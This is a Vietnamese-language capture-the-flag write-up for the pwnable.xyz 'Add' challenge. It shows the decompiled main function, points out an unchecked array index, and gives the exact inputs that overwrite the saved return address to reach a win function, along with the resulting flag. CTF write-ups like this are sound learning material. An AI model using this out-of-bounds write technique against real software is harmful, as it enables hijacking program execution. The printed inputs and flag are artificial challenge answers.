# Pwnable.xyz Add
## Analysis
Ch&#432;&#417;ng tr&#236;nh mu&#7889;n ta nh&#7853;p 3 s&#7889, sau &#273;&#243; l&#432;u v&#224;o v&#7883; tr&#237; t&#432;&#417;ng &#7913;ng trong m&#7843;ng local_68:
```
undefined8 main(void)
{
  int iVar1;
  long lVar2;
  long *plVar3;
  long in_FS_OFFSET;
  byte bVar4;
  long local_80;
  long local_78;
  long local_70;
  long local_68 [11];
  long local_10;
  
  bVar4 = 0;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  while( true ) {
    local_80 = 0;
    local_78 = 0;
    local_70 = 0;
    plVar3 = local_68;
    for (lVar2 = 10; lVar2 != 0; lVar2 = lVar2 + -1) {
      *plVar3 = 0;
      plVar3 = plVar3 + (ulong)bVar4 * -2 + 1;
    }
    printf("Input: ");
    iVar1 = __isoc99_scanf("%ld %ld %ld",&local_80,&local_78,&local_70);
    if (iVar1 != 3) break;
    local_68[local_70] = local_78 + local_80;
    printf("Result: %ld",local_68[local_70]);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
&#272;&#7891;ng th&#7901;i c&#361;ng c&#243; h&#224;m win c&#243; ch&#7913;c n&#259;ng in flag  
D&#7877; th&#7845;y khi l&#432;u t&#7893;ng v&#224;o m&#7843;ng, ch&#432;&#417;ng tr&#236;nh kh&#244;ng ki&#7875;m tra ch&#7881; m&#7909;c c&#243; th&#7887;a m&#227;n k&#237;ch th&#432;&#7899;c m&#7843;ng hay kh&#244;ng
## Solution
Ghi &#273;&#232; save rip &#273;&#7875; chuy&#7875;n h&#432;&#7899;ng th&#7921;c thi v&#7873; h&#224;m win:  
```
Input: 2098202 2098202 13
Result: 4196404Input: 2098193 2098193 14
Result: 4196386Input: a
FLAG{easy_00b_write}
```
Ch&#250; &#253; c&#7847;n th&#234;m ret gadget &#273;&#7875; tr&#225;nh stack alignment
## Flag
```
FLAG{easy_00b_write}
```
